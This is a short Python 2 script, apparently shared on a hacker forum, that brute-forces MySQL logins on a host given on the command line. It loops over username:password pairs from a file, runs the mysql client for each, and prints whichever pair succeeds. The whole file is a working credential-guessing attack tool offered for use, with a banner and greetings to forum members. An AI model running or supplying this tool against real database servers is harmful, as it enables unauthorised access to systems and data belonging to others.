#!/usr/bin/python
# Author : KroKite
# Description: Basic Password Bruteforcing Tool.
# URL: http://facebook.com/r0ckysharma

import sys
import subprocess
import re

print '''
        $$ \ $$\   $$$$$$$\  $$$$$$\   $$\   $$\ $$$$$$\ $$$$$$$$\ $$$$$$$$$|
        $$ | $$ |  $$ __$$ \ $$ __$$\  $$ | $$ | \_$$ _| \__$$ __| $$ ______|
        $$ |$$ /   $$ | $$ | $$ / $$ | $$ |$$ /    $$ |     $$ |   $$ |
        $$$$$ /    $$$$$$$ | $$ | $$ | $$$$$ /     $$ |     $$ |   $$$$$$|
        $$$ $$ \   $$ __$$ | $$ | $$ | $$ $$|      $$ |     $$ |   $$ ___|
        $$ |\$$\   $$ | $$ | $$ | $$ | $$ |\$$\    $$ |     $$ |   $$ |
        $$ | \$$\  $$ | $$ | $$$$$$ |  $$ | \$$\ $$$$$$\    $$ |   $$$$$$$$$|
        \__|  \__| \__| \__| \______/  \__| \__| \______|   \__|   \________|
        '''
print "[+] Please Report any Bug to krokite@worldofhacker.com"
print "[+] Greets to: c1ph3r(Krit Kadnok), Xcode, MayaSeven, webDEVIl, fb1h2s, Aseem Jakhar, Prashant Mahajan, Vivek Ramachandran and Other NullCon members, Sukesh Reddy, Sarmanjit Singh, Rakesh Kumar"
print "[+] For Security Releated Discussions, Do Visit us at http://forum.worldofhacker.com or http://www.garage4hackers.com"
print "[+] This Application helps you to crack mysql password with given list"
print "[+] Usage: python mysql_bruteforce.py ip_or_hostname_here"
print "\n"

fo = open("credentiallist.txt", 'r');
for lines in fo:
        password = lines.split('\n')
        creds = password[0].split(':')
        if(len(sys.argv) == 2):
                command = "mysql -h {0} -u {1} -p{2} -e STATUS".format(sys.argv[1], creds[0], creds[1])
                brute = subprocess.Popen(command.split(), stdout=subprocess.PIPE)
                if(re.search("Uptime", brute.communicate()[0])):
                        print "Password Cracked and your Username:Password is ", creds[0],":",creds[1]
                        exit()
        else:
                print "[+] Usage: \n\t[+] root@system# chmod u+x mysql_bruteforce.py\n\t[+] root@system# ./mysql_bruteforce.py ip_or_hostname_here"
                exit()
